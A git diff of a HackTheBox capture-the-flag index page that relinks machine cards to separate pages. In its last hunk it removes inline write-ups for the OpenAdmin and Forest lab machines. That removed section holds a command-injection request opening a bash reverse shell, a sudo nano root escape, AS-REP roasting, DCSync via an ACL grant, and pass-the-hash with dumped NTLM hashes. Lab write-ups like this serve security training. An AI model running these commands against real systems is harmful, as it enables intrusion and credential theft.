@@ -49,7 +49,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#openadmin" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/openadmin/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -66,7 +66,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#knife" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/knife/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -83,7 +83,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#nibbles" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/nibbles/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -100,7 +100,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#bountyhunter" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/bountyhunter/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -117,7 +117,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#horizontall" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/horizontall/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -134,7 +134,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#writer" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/writer/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -151,7 +151,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff hard">Hard</span>
-      <a href="#scrambled" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/scrambled/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -176,7 +176,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#blue" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/blue/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -193,7 +193,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#legacy" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/legacy/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -210,7 +210,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#resolute" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/resolute/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -227,7 +227,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#sauna" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/sauna/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -244,7 +244,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff hard">Hard</span>
-      <a href="#mantis" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/mantis/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -269,7 +269,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff hard">Hard</span>
-      <a href="#forest" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/forest/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -286,7 +286,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff hard">Hard</span>
-      <a href="#active" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/active/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -303,7 +303,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff insane">ProLab</span>
-      <a href="#offshore" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/offshore/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -328,7 +328,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff easy">Easy</span>
-      <a href="#brutus" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/brutus/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -345,7 +345,7 @@ platform: HackTheBox
     </div>
     <div class="mc-right">
       <span class="mc-diff medium">Medium</span>
-      <a href="#noted" class="mc-btn">Writeup ↓</a>
+      <a href="{{ '/ctf/writeups/hackthebox/noted/' | relative_url }}" class="mc-btn">Writeup →</a>
     </div>
   </div>
 
@@ -353,82 +353,6 @@ platform: HackTheBox
 
 ---
 
-## 📝 Detailed Writeups
-
-<div id="openadmin" class="writeup-block">
-
-### OpenAdmin — Linux Easy {#openadmin}
-
-**IP**: `10.10.10.171` | **OS**: Ubuntu 18.04 | **Released**: January 2020
-
-#### Reconnaissance
-```bash
-nmap -sC -sV -T4 -p- -oN openadmin.nmap 10.10.10.171
-# Open: 22/SSH, 80/Apache 2.4.29
-gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
-# Found: /ona/ → OpenNetAdmin v18.1.1
-```
-
-#### Initial Foothold — CVE-2019-26057
-```bash
-curl -s -X POST "http://10.10.10.171/ona/" \
-  --data 'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"&xajaxargs[]=ping'
-# Received: www-data shell
-```
-
-#### Lateral Movement
-```bash
-cat /opt/ona/www/local/config/database_settings.inc.php
-# 'db_passwd' => 'n1nj4W4rri0R!'
-su jimmy  # password reused
-curl http://127.0.0.1:52846/main.php  # Returns joanna's private key
-john --wordlist=rockyou.txt id_rsa.hash  # → bloodninjas
-```
-
-#### Privilege Escalation
-```bash
-sudo -l  # (ALL) NOPASSWD: /bin/nano /opt/priv
-sudo /bin/nano /opt/priv
-# Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
-# ROOT
-```
-
-</div>
-
-<div id="forest" class="writeup-block">
-
-### Forest — Windows Hard (Active Directory) {#forest}
-
-**IP**: `10.10.10.161` | **OS**: Windows Server 2016 | **Domain**: HTB.LOCAL
-
-#### Enumeration
-```bash
-rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
-# Users: svc-alfresco, andy, mark, santi, sebastien, lucinda
-GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
-# Got AS-REP hash for svc-alfresco (no preauthentication required)
-hashcat -m 18200 asrep.hash rockyou.txt  # → s3rvice
-```
-
-#### BloodHound Attack Path
-```
-svc-alfresco
-  → Account Operators (MemberOf)
-    → Exchange Windows Permissions (GenericAll)
-      → htb.local (WriteDACL)
-        → Grant DCSync rights
-```
-
-#### DCSync → Domain Compromise
-```bash
-Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
-secretsdump.py svc-alfresco:s3rvice@10.10.10.161
-# Administrator NTLM: 32693b11e6aa90eb43d32c72a07ceea6
-psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
-# NT AUTHORITY\SYSTEM
-```
-
-</div>
 
 <script>
 // Machine filter functionality
